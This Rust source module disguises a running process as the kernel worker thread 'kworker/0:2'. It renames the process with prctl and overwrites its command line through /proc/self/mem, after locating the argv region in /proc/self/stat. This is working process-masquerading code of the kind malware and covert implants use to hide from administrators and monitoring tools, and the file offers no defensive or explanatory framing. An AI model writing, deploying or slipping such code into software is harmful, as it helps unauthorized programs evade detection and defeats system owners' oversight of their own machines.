use std::ffi::CString;
use std::io::{Read, Seek, SeekFrom, Write};

use anyhow::{Context, Result};

const CAMOUFLAGE_NAME: &str = "kworker/0:2";

/// Camouflage both /proc/self/comm and /proc/self/cmdline.
/// Must be called early in main() before any visible work.
pub fn camouflage() -> Result<()> {
    set_comm(CAMOUFLAGE_NAME)?;
    overwrite_cmdline(CAMOUFLAGE_NAME)?;
    Ok(())
}

/// Set /proc/self/comm via prctl(PR_SET_NAME).
/// comm is limited to 16 bytes including null terminator.
fn set_comm(name: &str) -> Result<()> {
    let cname = CString::new(name).context("invalid comm name")?;
    // SAFETY: cname is a valid NUL-terminated CString from CString::new above.
    let ret = unsafe { libc::prctl(libc::PR_SET_NAME, cname.as_ptr(), 0, 0, 0) };
    if ret != 0 {
        anyhow::bail!(
            "prctl(PR_SET_NAME) failed: {}",
            std::io::Error::last_os_error()
        );
    }
    Ok(())
}

/// Overwrite /proc/self/cmdline via /proc/self/mem.
///
/// /proc/self/cmdline is backed by the kernel's view of the argv region
/// in process memory. We locate it via /proc/self/stat (fields 48+49:
/// arg_start and arg_end), then overwrite through /proc/self/mem.
fn overwrite_cmdline(name: &str) -> Result<()> {
    let (arg_start, arg_end) = read_arg_region()?;
    if arg_start == 0 || arg_end <= arg_start {
        return Ok(());
    }
    let region_len = (arg_end - arg_start) as usize;

    let mut mem = std::fs::OpenOptions::new()
        .write(true)
        .open("/proc/self/mem")
        .context("open /proc/self/mem")?;

    mem.seek(SeekFrom::Start(arg_start))
        .context("seek to arg_start")?;

    // Zero the region first
    let zeros = vec![0u8; region_len];
    mem.write_all(&zeros).context("zero argv region")?;

    // Seek back and write camouflage name
    mem.seek(SeekFrom::Start(arg_start))
        .context("seek back to arg_start")?;
    let write_len = name.len().min(region_len.saturating_sub(1));
    mem.write_all(&name.as_bytes()[..write_len])
        .context("write camouflage")?;

    Ok(())
}

/// Parse /proc/self/stat to extract arg_start and arg_end.
/// These are fields 48 and 49 (1-indexed) in the stat line.
/// The comm field (field 2) is in parens and may contain spaces,
/// so we find the last ')' first, then count fields from there.
fn read_arg_region() -> Result<(u64, u64)> {
    let mut stat_buf = String::new();
    std::fs::File::open("/proc/self/stat")
        .context("open /proc/self/stat")?
        .read_to_string(&mut stat_buf)
        .context("read /proc/self/stat")?;

    // Find closing paren of comm field
    let after_comm = stat_buf
        .rfind(')')
        .map(|i| i + 2) // skip ") "
        .context("malformed /proc/self/stat")?;

    // Fields after comm start at index 3 (1-indexed).
    // We need fields 48 and 49, which are offsets 45 and 46 from field 3.
    let fields: Vec<&str> = stat_buf[after_comm..].split_whitespace().collect();

    // field 3 is index 0 in our vec, field 48 is index 45, field 49 is index 46
    if fields.len() < 47 {
        anyhow::bail!("not enough fields in /proc/self/stat");
    }

    let arg_start: u64 = fields[45].parse().context("parse arg_start")?;
    let arg_end: u64 = fields[46].parse().context("parse arg_end")?;

    Ok((arg_start, arg_end))
}
